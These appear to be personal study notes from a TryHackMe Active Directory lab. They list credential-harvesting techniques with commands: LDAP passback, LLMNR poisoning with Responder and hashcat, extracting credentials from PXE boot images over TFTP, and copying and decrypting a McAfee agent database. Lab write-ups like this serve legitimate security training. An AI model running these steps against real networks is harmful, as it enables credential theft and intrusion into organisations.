# Breaching AD (thm)

* Password praying
* LDAP passback&#x20;
  * Exemple : modify printer setting and specify our server (plain text setting)&#x20;
  * Set up netcat server or ldap server(if there is ldap connection handshake)
  * connect printer to our server&#x20;
  * and we got  plain text password with tcpdump

<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2f78ae2b44ef76453a80144dac86b4e.png" alt=""><figcaption></figcaption></figure>



* Authentication relay -> LLMNR Poisoning

<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6baba3537d36d0fa78c6f61cf1386f6f.png" alt=""><figcaption></figcaption></figure>

```
sudo responder -I <interface>
hashcat -m 5600 <hash file> <password file> --force

```

* Microsoft Deployment Toolkit

<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8117a18103e98ee2ccda91fc87c63606.png" alt=""><figcaption></figcaption></figure>

```
# Connect to windows machine
# Download .bcd file via tftp
tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
# read bcd file with powerxpe
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile

# After getting pxe image via powerpxe, download it 
tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
# Retrieve Creds
Get-FindCredentials -WimFile pxeboot.wim


```

* McAfee configuration file

```
# Retrieve the ma.db file from C:\ProgramData\McAfee\Agent\DB
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
# read it with sqlite browser
sqlitebrowser ma.db
# After getting creds, crack password with mcafeesitelistpwddecryption
python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>

```
